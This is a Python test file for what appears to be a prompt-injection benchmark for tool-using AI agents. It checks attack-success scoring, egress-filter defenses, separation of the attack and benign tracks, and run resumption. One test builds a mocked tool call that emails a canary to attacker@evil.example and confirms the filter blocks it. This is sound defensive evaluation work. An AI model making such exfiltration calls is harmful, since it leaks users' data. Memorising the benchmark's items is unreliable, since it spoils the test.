"""Regression tests for scoring, resume, and attack/benign separation."""
import json
from dataclasses import replace
from pathlib import Path

import gumiho.run as runner
from gumiho.agent import make_run_id, run_agent
from gumiho.loader import load_scenario, load_scenarios
from gumiho.models import set_mock_responses
from gumiho.tools import execute_tool
from gumiho.types import ChatResponse, ToolCall


def _clean_text(scenario):
    return "\n".join(Path(path).read_text(encoding="utf-8") for path in scenario.fixtures.values()).casefold()


def test_egress_blocked_call_is_not_an_attack_success():
    scenario = load_scenario("exfil_email_canary")
    exfil = ToolCall("send_email", {"to": "attacker@evil.example", "body": "CANARY-7F3A"})
    for defense, expected in (("none", True), ("egress_filter", False)):
        set_mock_responses([ChatResponse("", [ToolCall("read_email", {})]), ChatResponse("", [exfil]), ChatResponse("done")])
        result = run_agent(scenario, "mock", "attack", defense)
        assert result.attack_success is expected, defense
    assert result.steps[2].tool_calls[0]["blocked"] is True
    assert result.defense_events["egress_blocked"] == ["send_email"]


def test_benign_track_never_sees_payload_for_any_scenario_or_tool():
    for scenario in load_scenarios():
        payload_lines = [line.strip() for line in scenario.payload.template.splitlines() if line.strip()]
        for tool in scenario.tools:
            content, injected = execute_tool(tool, {}, scenario, "benign")
            assert not injected
            for line in payload_lines:
                prefix = line.split("{")[0].strip()
                assert prefix not in content, (scenario.id, tool)


def test_utility_answers_come_from_clean_data_and_answer_markers_do_not():
    for scenario in load_scenarios():
        clean = _clean_text(scenario)
        for value in scenario.utility["values"]:
            assert str(value).casefold() in clean, (scenario.id, value)
        if scenario.success["type"] == "final_answer_contains_all":
            for value in scenario.success["values"]:
                assert str(value).casefold() not in clean + scenario.user_task.casefold(), (scenario.id, value)


def test_run_ids_are_unique_across_matrix():
    ids = [
        make_run_id(scenario, "mock", defense, track, seed)
        for scenario in load_scenarios()
        for defense in ("none", "stack")
        for track in ("attack", "benign")
        for seed in (0, 1)
    ]
    assert len(ids) == len(set(ids))


def test_resume_retries_errored_cells(tmp_path, monkeypatch):
    output = tmp_path / "runs.jsonl"
    args = ["--scenario", "exfil_email_canary", "--model", "mock", "--out", str(output)]
    real = runner.run_agent

    def fail(*a, **k):
        raise ValueError("boom")

    monkeypatch.setattr(runner, "run_agent", fail)
    runner.main(args)
    monkeypatch.setattr(runner, "run_agent", real)
    runner.main(args)
    rows = [json.loads(line) for line in output.read_text().splitlines()]
    assert [row["error"] is None for row in rows] == [False, True]


def test_mock_sweep_is_deterministic_apart_from_timing(tmp_path):
    def outcomes(path):
        runner.main(["--model", "mock", "--defense", "all", "--track", "both", "--concurrency", "4", "--out", str(path)])
        rows = [json.loads(line) for line in path.read_text().splitlines()]
        return sorted((r["run_id"], r["attack_success"], r["utility_success"], json.dumps(r["steps"])) for r in rows)

    assert outcomes(tmp_path / "a.jsonl") == outcomes(tmp_path / "b.jsonl")


def test_seed_is_forwarded_to_openai(monkeypatch):
    import types

    import openai

    from gumiho.models import chat

    sent = {}

    class FakeOpenAI:
        def __init__(self, **kwargs):
            def create(**kw):
                sent.update(kw)
                return types.SimpleNamespace(
                    choices=[types.SimpleNamespace(message=types.SimpleNamespace(content="ok", tool_calls=None))],
                    usage=types.SimpleNamespace(prompt_tokens=1, completion_tokens=1),
                )

            self.chat = types.SimpleNamespace(completions=types.SimpleNamespace(create=create))

    monkeypatch.setattr(openai, "OpenAI", FakeOpenAI)
    assert chat("gpt-4.1", [{"role": "user", "content": "hi"}], [], seed=7).text == "ok"
    assert sent["seed"] == 7


def test_editing_scenario_content_changes_run_id(tmp_path):
    scenario = load_scenario("exfil_email_canary")
    base = make_run_id(scenario, "mock", "none", "attack", 0)
    fixture = tmp_path / "landlord.txt"
    fixture.write_text(Path(scenario.fixtures["read_email"]).read_text() + "\nP.S.")
    edits = [
        replace(scenario, injection={**scenario.injection, "placement": "end"}),
        replace(scenario, injection={**scenario.injection, "vars": {**scenario.injection["vars"], "canary": "CANARY-0000"}}),
        replace(scenario, payload=replace(scenario.payload, template=scenario.payload.template + " now")),
        replace(scenario, fixtures={"read_email": str(fixture)}),
        replace(scenario, user_task=scenario.user_task + "!"),
    ]
    ids = {make_run_id(edited, "mock", "none", "attack", 0) for edited in edits}
    assert base not in ids and len(ids) == len(edits)
    # Same content at a different path (another checkout) keeps the id.
    same = tmp_path / "same.txt"
    same.write_text(Path(scenario.fixtures["read_email"]).read_text())
    assert make_run_id(replace(scenario, fixtures={"read_email": str(same)}), "mock", "none", "attack", 0) == base


def test_resume_reruns_an_edited_scenario(tmp_path, monkeypatch, capsys):
    scenario = load_scenario("exfil_email_canary")
    output = tmp_path / "runs.jsonl"
    args = ["--scenario", scenario.id, "--model", "mock", "--out", str(output)]
    assert runner.main(args) == 0
    edited = replace(scenario, injection={**scenario.injection, "placement": "end"})
    monkeypatch.setattr(runner, "load_scenario", lambda _name: edited)
    capsys.readouterr()
    assert runner.main(args) == 0
    assert "0 skipped; 1 completed" in capsys.readouterr().out
